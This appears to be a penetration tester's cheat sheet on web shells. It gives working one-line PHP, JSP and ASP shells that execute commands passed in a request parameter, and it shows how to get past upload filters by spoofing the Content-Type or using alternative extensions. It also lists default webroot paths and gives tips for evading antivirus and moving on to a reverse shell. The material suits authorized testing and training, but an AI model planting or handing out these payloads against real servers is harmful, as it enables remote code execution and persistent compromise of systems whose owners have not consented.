# Web Shells

Script uploaded to a target web server. Commands are sent via HTTP request and output is returned in the browser — bypasses firewall rules that would block reverse shells, and survives reboots.

Requires: a file upload vulnerability, writable webroot, or code injection point.

---

## Quick One-Liners

For when you just need a fast single-file drop with no setup.

| Language | Shell | Server |
|---|---|---|
| PHP | `<?php system($_REQUEST["cmd"]); ?>` | Apache/Nginx (Linux) |
| ASPX | See [[_Tools/Laudanum\|Laudanum]] or [[_Tools/Antak\|Antak]] | IIS (Windows) |
| JSP | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` | Tomcat |
| ASP | `<% eval request("cmd") %>` | IIS (older) |

Full one-liners with usage: [[_Reference/Shells|Shells Reference → Web Shell]]

---

## Tool-Based Web Shells

For more capability than a one-liner — file upload/download, encoding, auth protection, reverse shell callbacks.

| Tool | Languages | Target | Notes |
|---|---|---|---|
| [[_Tools/Laudanum\|Laudanum]] | asp, aspx, jsp, php, more | Any | Pre-built collection — edit IP before use, strip comments |
| [[_Tools/Antak\|Antak]] | aspx | Windows / IIS | PowerShell-based shell from Nishang — set credentials on line 14 |

---

## Bypassing File Type Restrictions

Upload filters often check the `Content-Type` header rather than the actual file content. Intercept the upload request in Burp Suite and change the Content-Type to a permitted image type.

```
# In Burp Suite — intercept the POST upload request
# Change:
Content-Type: application/x-php
# To:
Content-Type: image/gif
```

Then forward the request. The server accepts the file as an image while still saving the `.php` (or other) extension, which the web server will execute when browsed.

> This only works when the server validates Content-Type and not the actual file magic bytes or extension server-side. If it checks the extension too, you may need to try `.php5`, `.phtml`, `.phar`, or double extensions like `.php.jpg`.

---

## Default Webroot Paths

| Server | Path |
|---|---|
| Apache (Linux) | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS (Windows) | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

---

## Operational Notes

> Strip ASCII art and comments from any tool-based shell before uploading — AV and defenders commonly signature on them.

> Check the server response after upload for the save path — it won't always match what you uploaded.

> Some apps randomise filenames on upload. If you can't find your shell, check the app's files directory or any path leaked in the response.

> Web shells leave HTTP access logs. Consider this if stealth matters.

> Some apps auto-delete uploaded files after a set period — establish a reverse shell session as soon as possible and delete the web shell file yourself once you have it.

> Command chaining (e.g. `whoami && hostname`) may not work in non-interactive web shells — run commands individually.

> Document every payload tried: filename, hash (sha1/md5), upload path, and outcome. Include this in the report as evidence and for attribution.

> Prefer establishing a reverse shell and deleting the web shell payload over leaving it sitting on the target.
